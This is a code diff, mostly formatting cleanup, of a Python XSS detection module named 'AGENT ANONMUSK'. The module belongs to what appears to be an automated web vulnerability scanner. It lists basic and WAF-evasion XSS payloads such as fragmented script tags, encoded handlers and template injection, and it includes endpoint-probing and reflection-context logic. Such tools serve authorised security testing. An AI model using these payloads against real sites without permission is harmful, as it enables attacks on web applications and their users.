@@ -1,4 +1,4 @@
-﻿"""
+"""
 AGENT ANONMUSK — XSS Engine
 ===========================
 Reflected & Stored XSS detection with fragmented injection for WAF evasion.
@@ -9,10 +9,9 @@ from __future__ import annotations
 import logging
 import re
 import html
-from typing import Optional
 from urllib.parse import quote
 
-from core.context import Evidence, Finding, Severity, VulnType
+from core.context import Finding, Severity, VulnType
 from modules.base import BaseModule
 from utils.http_client import HTTPClient
 
@@ -21,29 +20,29 @@ logger = logging.getLogger("AGENT ANONMUSK.injection.xss")
 # ── Payload Database ─────────────────────────────────────────
 
 BASIC_PAYLOADS = [
-    '<script>alert(1)</script>',
+    "<script>alert(1)</script>",
     '"><script>alert(1)</script>',
     "'-alert(1)-'",
-    '<img src=x onerror=alert(1)>',
-    '<svg onload=alert(1)>',
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
     '"><img src=x onerror=alert(1)>',
     "javascript:alert(1)",
-    '<body onload=alert(1)>',
+    "<body onload=alert(1)>",
 ]
 
 # Fragmented / WAF-evasion payloads
 WAF_EVASION_PAYLOADS = [
-    '<scr<script>ipt>alert(1)</scr</script>ipt>',
+    "<scr<script>ipt>alert(1)</scr</script>ipt>",
     '<img src=x onerror="al\\x65rt(1)">',
-    '<svg/onload=alert(1)>',
+    "<svg/onload=alert(1)>",
     '"><svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>',
-    '<img src=x onerror=prompt(1)>',
+    "<img src=x onerror=prompt(1)>",
     '"><details open ontoggle=alert(1)>',
     '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
     "'-alert`1`-'",
     '"><iframe srcdoc="<script>alert(1)</script>">',
-    '<input onfocus=alert(1) autofocus>',
-    '<marquee onstart=alert(1)>',
+    "<input onfocus=alert(1) autofocus>",
+    "<marquee onstart=alert(1)>",
     "{{constructor.constructor('alert(1)')()}}",  # Angular template injection
     "${alert(1)}",  # Template literal injection
 ]
@@ -80,10 +79,7 @@ class XSSEngine(BaseModule):
         params_to_test = self._attack_params.get("parameters", [])
 
         if not target_urls:
-            target_urls = [
-                ep.url for ep in self.ctx.endpoints
-                if ep.interesting and ep.params
-            ]
+            target_urls = [ep.url for ep in self.ctx.endpoints if ep.interesting and ep.params]
 
         if not target_urls:
             self._log_complete("No endpoints with parameters to test")
@@ -99,9 +95,7 @@ class XSSEngine(BaseModule):
             timeout=scan_config.get("request_timeout", 15),
         ) as client:
             for url in target_urls[:30]:  # Top 30 endpoints
-                await self._test_endpoint(
-                    client, url, params_to_test, max_payloads, waf_evasion
-                )
+                await self._test_endpoint(client, url, params_to_test, max_payloads, waf_evasion)
 
         self._log_complete("XSS testing complete")
 
@@ -114,7 +108,7 @@ class XSSEngine(BaseModule):
         waf_evasion: bool,
     ):
         """Test a single endpoint for XSS."""
-        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+        from urllib.parse import urlparse, parse_qs
 
         parsed = urlparse(url)
         params = parse_qs(parsed.query, keep_blank_values=True)
@@ -137,7 +131,9 @@ class XSSEngine(BaseModule):
                 context = self._detect_context(resp.text, CANARY)
                 logger.debug(
                     "Reflection found for '%s' at %s (context: %s)",
-                    param_name, url, context,
+                    param_name,
+                    url,
+                    context,
                 )
 
                 # Step 3: Select payloads based on context and WAF
@@ -176,7 +172,8 @@ class XSSEngine(BaseModule):
                             self.ctx.add_finding(finding)
                             logger.warning(
                                 "🎯 XSS found: %s (param: %s)",
-                                url, param_name,
+                                url,
+                                param_name,
                             )
                             break  # One payload per param is enough
 
@@ -208,14 +205,14 @@ class XSSEngine(BaseModule):
             return "unknown"
 
         # Look at surrounding characters
-        before = body[max(0, idx - 50):idx]
-        after = body[idx + len(canary):idx + len(canary) + 50]
+        before = body[max(0, idx - 50) : idx]
+        _ = body[idx + len(canary) : idx + len(canary) + 50]
 
-        if re.search(r'<script[^>]*>.*$', before, re.DOTALL):
+        if re.search(r"<script[^>]*>.*$", before, re.DOTALL):
             return "js_string"
         if re.search(r'="[^"]*$', before) or re.search(r"='[^']*$", before):
             return "html_attribute"
-        if re.search(r'<[a-zA-Z][^>]*$', before):
+        if re.search(r"<[a-zA-Z][^>]*$", before):
             return "html_tag"
         if "url(" in before.lower() or "href" in before.lower():
             return "url_context"
